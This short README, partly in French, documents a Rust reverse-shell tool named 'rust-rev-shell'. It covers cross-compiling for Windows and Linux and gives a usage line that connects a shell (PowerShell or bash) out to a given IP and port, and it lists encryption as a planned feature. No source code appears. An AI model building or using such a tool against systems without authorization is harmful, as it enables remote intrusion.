# rust-rev-shell

# Installation
- Pour ajouter le compilateur Windows depuis Linux :

```rustup target add x86_64-pc-windows-gnu && cargo install cross```

- Pour ajouter le compilateur Linux depuis Windows :

```rustup target add x86_64-unknown-linux-gnu && cargo install cross```

# Compilation
- Linux for Linux :

``` cargo build ```

- Windows for Windows:

``` cargo build ```

- Linux for Windows :

```cross build --target x86_64-pc-windows-gnu --release```

- Windows for Linux :

```cargo build --target x86_64-unknown-linux-gnu --release```

# Usage
``` ./revshell <IP> <PORT> <powershell|bash> ```

# ToDo
- Add Linux support
- Split function in multiple files
- Encryption
